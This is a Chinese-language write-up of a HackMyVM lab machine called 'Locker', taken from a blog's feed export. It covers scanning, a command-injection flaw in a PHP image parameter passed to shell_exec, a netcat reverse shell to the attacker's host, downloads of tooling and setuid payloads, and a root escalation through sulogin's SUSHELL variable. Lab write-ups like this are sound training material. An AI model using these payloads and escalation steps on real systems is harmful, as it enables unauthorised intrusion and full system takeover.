        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Locker</title>
    <url>/posts/37260.html</url>
    <content><![CDATA[<p>HMV-Locker靶机复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.190</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">10</span> <span class="number">15</span>:<span class="number">09</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.190</span> (<span class="number">192.168</span>.<span class="number">179.190</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">7</span>E:C0:A5:<span class="number">40</span>:<span class="number">29</span>:<span class="number">72</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.80</span> ms <span class="number">192.168</span>.<span class="number">179.190</span> (<span class="number">192.168</span>.<span class="number">179.190</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.06</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>竟然只开放了一个80端口，用-p-参数也是只发现这一个端口</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.190</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>SUPER LOCKER<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">Use root password to unlock our powers!</span><br><span class="line">aAaaaAAaaAaAAaAAaAAaaaA!</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/locker.php?image=1&quot;</span>&gt;</span>Model 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>提示和root有关，但是这里也没有ssh服务可以爆破，先扫扫目录吧</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u 192.168.179.190 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.190</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line"><span class="section">Progress: 207643 / 207644 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure></div>
<p>去浏览器里看看，发现有一个超链接<br><img src="https://pic1.imgdb.cn/item/67a9c019d0e0a243d4fdee85.png"><br>点进去之后出现一个锁的图片，并且url中多了一个image参数，修改这个参数的值会出现不同的锁的图片<br>但是用sqlmap尝试发现不是可以sql注入的。<br>现在和url参数有关的就只有wfuzz了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.179.190/locker.php?FUZZ=1 --hw 2</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.179.190/locker.php?FUZZ=1</span><br><span class="line">Total requests: 4734</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                            </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000002172:   200        803 L    805 W      61829 Ch    &quot;image&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 84.76008</span><br><span class="line">Processed Requests: 4734</span><br><span class="line">Filtered Requests: 4733</span><br><span class="line">Requests/sec.: 55.85175</span><br></pre></td></tr></table></figure></div>
<p>搜出来locker.php这个文件还是只有参数imgae。没有进展了，看wp知道了这里存在命令注入<br>具体是怎么发现的呢？<br>我们重新扫一下目录，但是指定后缀扫描，发现有三个jpg文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u 192.168.179.190 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,jpg,webp </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.190</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              html,php,jpg,webp</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 142]</span><br><span class="line">/1.jpg                (Status: 200) [Size: 45726]</span><br><span class="line">/2.jpg                (Status: 200) [Size: 66605]</span><br><span class="line">/3.jpg                (Status: 200) [Size: 62722]</span><br></pre></td></tr></table></figure></div>
<p>在bp中发现，如果?imgage&#x3D;1可以访问到第一张图片，但是?image&#x3D;1.jpg却不能显示<br><img src="https://pic1.imgdb.cn/item/67a9c019d0e0a243d4fdee84.png"><br><img src="https://pic1.imgdb.cn/item/67a9c002d0e0a243d4fdee77.png"><br>所以很有可能是自动在后面拼接了.jpg，所以如果输入了.jpg就会变成1.jpg.jpg无法访问<br>现在用;闭合,发现可以成功访问了<br><img src="https://pic1.imgdb.cn/item/67a9c012d0e0a243d4fdee7e.png"><br>既然这里是读取文件的，那就去看这个locker.php的具体代码是什么样的<br>?image&#x3D;locker.php()</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Feb 2025 07:51:35 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>244</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/jpg;base64,</span></span></span><span class="language-php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="variable">$image</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="variable">$command</span> = <span class="string">&quot;cat &quot;</span>.<span class="variable">$image</span>.<span class="string">&quot;.jpg | base64&quot;</span>;</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="keyword">print</span><span class="string">&#x27;&lt;img src=&quot;data:image/jpg;base64,&#x27;</span>.<span class="variable">$output</span>.<span class="string">&#x27;&quot;width=&quot;150&quot;height=&quot;150&quot;/&gt;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="meta">?&gt;</span></span><span class="language-xml"><span class="tag"><span class="string"></span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-php-template">&quot;</span><span class="attr">width</span>=<span class="string">&quot;150&quot;</span><span class="attr">height</span>=<span class="string">&quot;150&quot;</span>/&gt;</span></span></span></span><br></pre></td></tr></table></figure></div>
<p>逻辑是先获取我们image输入的参数，在后面拼接.jpg然后执行这个命令，所以我们可以用;把前面一个cat闭合然后输入想要执行的命令最后输入;截断<br><img src="https://pic1.imgdb.cn/item/67a9bffed0e0a243d4fdee74.png"><br>成功！<br>所以输入反弹shell指令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/locker.php?image=;nc</span> -e <span class="string">/bin/bash</span> 192.168.179.83 <span class="string">1234;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-routeros">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-routeros">└─# nc -lp 1234         </span></span><br><span class="line"><span class="language-routeros">id</span></span><br><span class="line"><span class="language-routeros"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span></span><br></pre></td></tr></table></figure></div>
<p>成功拿到webshell<br>美化下终端：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data@locker:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">cat</span> bbb             </span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal <span class="built_in">type</span> unknown</span><br><span class="line">Terminal <span class="built_in">type</span>? xterm</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">stty</span> -a                                                    </span><br><span class="line">speed 9600 baud; rows 34; columns 116; line = 0;</span><br><span class="line">intr = ^C; quit = ^\; erase = ^?; <span class="built_in">kill</span> = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q;</span><br><span class="line">stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; <span class="keyword">time</span> = 0;</span><br><span class="line">-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts</span><br><span class="line">-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel -iutf8</span><br><span class="line">opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0</span><br><span class="line">isig icanon iexten <span class="built_in">echo</span> echoe -echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc</span><br><span class="line"></span><br><span class="line">www-data@locker:~/html$ <span class="built_in">stty</span> rows 34 columns 116 </span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@locker</span>:~<span class="regexp">/html$ sudo -l</span></span><br><span class="line"><span class="regexp">bash: sudo: command not found</span></span><br><span class="line"><span class="regexp">www-data@locker:~/html</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/sbin</span><span class="regexp">/sulogin</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br></pre></td></tr></table></figure></div>
<p>sudo没有 suid也没有特殊的。 先上传一个自动检测提权的脚本linpeas.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.179.190</span> - - <span class="string">[10/Feb/2025 16:01:32]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.179.190</span> - - <span class="string">[10/Feb/2025 16:01:32]</span> <span class="string">&quot;<span class="keyword">GET</span> /lineas.sh HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168.179.190</span> - - <span class="string">[10/Feb/2025 16:01:38]</span> <span class="string">&quot;<span class="keyword">GET</span> /linpeas.sh HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">www-data@locker:/tmp$ wget <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">83</span>/linpeas.sh</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">01</span>:<span class="number">38</span>--  http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">83</span>/linpeas.sh</span><br><span class="line">Connecting to <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">332111</span> (324K) <span class="string">[text/x-sh]</span></span><br><span class="line">Saving to: &#x27;linpeas.sh&#x27;</span><br><span class="line"></span><br><span class="line">linpeas.sh                     <span class="number">0</span>%<span class="string">[                                               ]</span>       <span class="number">0</span>  --.-KB/s              linpeas.sh                   <span class="number">100</span>%<span class="string">[==============================================&gt;]</span> <span class="number">324</span>.33K  --.-KB/s    in <span class="number">0</span>.01s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">01</span>:<span class="number">38</span> (<span class="number">24</span>.<span class="number">8</span> MB/s) - &#x27;linpeas.sh&#x27; saved <span class="string">[332111/332111]</span></span><br><span class="line"></span><br><span class="line">www-data@locker:/tmp$ chmod +x linpeas.sh </span><br><span class="line">www-data@locker:/tmp$ ./linpeas.sh</span><br></pre></td></tr></table></figure></div>

<p>没有扫出什么东西. 卡住了<br>原来是sulogin这个有suid也是可以利用的<br>我们可以指定环境变量，决定启用什么shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">ENVIRONMENT VARIABLES</span><br><span class="line">       sulogin looks <span class="keyword">for</span> <span class="keyword">the</span> environment variable SUSHELL <span class="keyword">or</span> sushell <span class="keyword">to</span> determine what shell <span class="keyword">to</span> start.  If <span class="keyword">the</span> environment variable <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span>, <span class="keyword">it</span> will <span class="keyword">try</span> <span class="keyword">to</span> execute root&#x27;s shell <span class="keyword">from</span> /etc/passwd.  If <span class="keyword">that</span> fails,  <span class="keyword">it</span>  will  fall</span><br><span class="line">       <span class="keyword">back</span> <span class="keyword">to</span> /bin/sh.</span><br></pre></td></tr></table></figure></div>
<p>在这里，如果我们直接用sulogin -e 是没法进入shell的，需要密码<br>但是如果指定了SUSHELL就可以（比如这里我进一个sh）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">www-data@locker:/etc$ <span class="built_in">export</span> <span class="attribute">SUSHELL</span>=/bin/sh</span><br><span class="line">www-data@locker:/etc$ sulogin -e</span><br><span class="line">Press Enter <span class="keyword">for</span> maintenance</span><br><span class="line">(<span class="keyword">or</span> press Control-D <span class="keyword">to</span> continue): </span><br><span class="line">$ id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure></div>
<p>那现在就可以写一个脚本来利用了.在本地写利用脚本然后上传到靶机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">└─# cat tmp<span class="selector-class">.c</span></span><br><span class="line"><span class="selector-id">#include</span> &lt;stdio<span class="selector-class">.h</span>&gt;</span><br><span class="line"><span class="selector-id">#include</span> &lt;unistd<span class="selector-class">.h</span>&gt;</span><br><span class="line"><span class="selector-id">#include</span> &lt;stdlib<span class="selector-class">.h</span>&gt;</span><br><span class="line">int <span class="selector-tag">main</span>()&#123;</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(&quot;/bin/bash&quot;);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">└─# gcc tmp<span class="selector-class">.c</span> -o locker -static</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">└─# python3 -m http<span class="selector-class">.server</span> <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"></span><br><span class="line">www-data<span class="keyword">@locker</span>:~$ cd /tmp</span><br><span class="line">www-data<span class="keyword">@locker</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">179.83</span>/locker</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">26</span>:<span class="number">06</span>--  <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">179.83</span>/locker</span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">179.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Length</span>: <span class="number">70536</span> (<span class="number">69</span>K) [application/octet-stream]</span><br><span class="line">Saving <span class="attribute">to</span>: <span class="string">&#x27;locker&#x27;</span></span><br><span class="line"></span><br><span class="line">locker                         <span class="number">0%</span>[                                               ]       <span class="number">0</span>  --.-KB/s              locker                       <span class="number">100%</span>[==============================================&gt;]  <span class="number">68.88</span>K  --.-KB/s    in <span class="number">0.005s</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">26</span>:<span class="number">07</span> (<span class="number">14.8</span> MB/s) - <span class="string">&#x27;locker&#x27;</span> saved [<span class="number">70536</span>/<span class="number">70536</span>]</span><br></pre></td></tr></table></figure></div>
<p>这里有一点要注意，如果编译的时候后面没有加上-static，就不是静态链接可执行文件（不依赖动态库）<br>但是不知道为什么我这么做了之后显示exec format error<br>我就改成用python脚本了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOONSCRIPT"><figure class="iseeu highlight /moonscript"><table><tr><td class="code"><pre><span class="line">#!/bin/python3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">os</span>.setuid(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">os</span>.setgid(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">os</span>.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">179.83</span>/setuid.py</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span><span class="symbol">:</span><span class="number">52</span><span class="symbol">:</span><span class="number">30</span>--  <span class="symbol">http:</span>/<span class="regexp">/192.168.179.83/setuid</span>.py</span><br><span class="line"><span class="title class_">Connecting</span> to <span class="number">192.168</span>.<span class="number">179.83</span><span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">134</span> [text/x-python]</span><br><span class="line"><span class="title class_">Saving</span> <span class="symbol">to:</span> <span class="string">&#x27;setuid.py&#x27;</span></span><br><span class="line"></span><br><span class="line">setuid.py           <span class="number">100</span><span class="string">%[===================&gt;]</span>     <span class="number">134</span>  --.-<span class="variable constant_">KB</span>/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span><span class="symbol">:</span><span class="number">52</span><span class="symbol">:</span><span class="number">30</span> (<span class="number">1.62</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;setuid.py&#x27;</span> saved [<span class="number">134</span>/<span class="number">134</span>]</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod +x setuid.py</span><br><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>export <span class="variable constant_">SUSHELL</span>=<span class="regexp">/tmp/setuid</span>.py</span><br><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>/usr/sbin/sulogin -e</span><br><span class="line"><span class="title class_">Press</span> <span class="title class_">Enter</span> <span class="keyword">for</span> maintenance</span><br><span class="line">(<span class="keyword">or</span> press <span class="title class_">Control</span>-D to continue): </span><br><span class="line"><span class="variable constant_">UID</span> <span class="keyword">and</span> <span class="variable constant_">GID</span> set</span><br><span class="line">root<span class="variable">@locker</span><span class="symbol">:~</span><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>总结：学到了一般有url参数的时候的另一种思考方向：命令执行注入<br>gobuster可以-x指定后缀，可以找到更多的路径<br>sulogin是一个新学会的东西。这个和靶机扫不到ip然后进入single但用户模式的原理是一样的<br>用sulogin提权就是修改SUSHELL。现在我也学到用python怎么写setuid的脚本<br>c语言编译选项加上 -static就是生成静态链接文件，不用动态库</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-SuidyRevenge</title>
    <url>/posts/23894.html</url>
    <content><![CDATA[<p>HMV-SuidyRevenge靶机复盘  </p>
<span id="more"></span>

